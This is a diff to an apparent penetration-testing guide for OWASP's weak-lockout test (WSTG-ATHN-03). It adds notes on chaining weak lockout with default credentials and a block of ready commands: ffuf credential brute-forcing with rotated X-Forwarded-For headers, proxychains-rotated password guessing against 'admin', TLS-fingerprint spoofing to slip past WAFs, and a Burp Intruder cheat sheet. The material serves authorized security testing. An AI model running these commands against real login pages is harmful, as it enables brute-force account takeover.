@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [authentication, login, credentials, mfa, wstg, athn]
 tech_stack: []
 cwe_ids: [CWE-304]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-athn-01, wstg-athn-02]
+prerequisites: [wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-athn-02: "Weak Lockout + Default Credentials = no throttling on default-credential guessing across the entire user base (Mass Account Takeover, Critical)"
 ---
 
 # wstg-athn-03
@@ -301,6 +302,35 @@ echo "Invalid username response: $invalid_response"
 ---
 
 ## Example Commands/Payloads
+
+### Rate-Limit / IP-Rotation Bypass
+
+```bash
+# ffuf pitchfork-style: rotate X-Forwarded-For per credential pair to defeat per-IP throttling
+# while brute-forcing a single account (combine with a matching IP wordlist)
+ffuf -w usernames.txt:USER -w passwords.txt:PASS -w ipv4-list.txt:FUZZ \
+     -u "https://{target}/login" \
+     -X POST -d "username=USER&password=PASS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -H "X-Forwarded-For: FUZZ" \
+     -mc all
+
+# Route each attempt through a different upstream proxy (SOCKS5/HTTP chain) to rotate
+# the *source* IP itself, not just a spoofable header — bypasses lockout that trusts
+# the TCP peer IP over X-Forwarded-For
+# proxychains.conf: random_chain, chain_len = 1, then list socks5/http proxies
+proxychains ffuf -w passwords.txt -u "https://{target}/login" -X POST -d "username=admin&password=FUZZ"
+
+# Spoof the TLS client fingerprint (JA3) to defeat WAF/rate-limiters that block on
+# TLS-handshake fingerprint rather than IP or headers
+curl_chrome116 -s -X POST "https://{target}/login" -d "username=admin&password=wrong"
+
+# Burp Intruder attack-type selection cheat sheet for lockout testing:
+#   Sniper       - single position, cycle one payload set (password spray against 1 user)
+#   Battering ram - same payload in all positions simultaneously
+#   Pitchfork    - parallel lists, nth-entry pairing (paired username:password lists)
+#   Cluster bomb - full cartesian product of multiple payload sets (user x pass matrix)
+```
 
 ### Lockout Testing Script
 
@@ -615,6 +645,7 @@ class SmartLockout:
 - [OWASP WSTG - Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
 - [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
 - [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
+- [PayloadsAllTheThings - Brute Force & Rate Limit](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit)
 
 
 ---
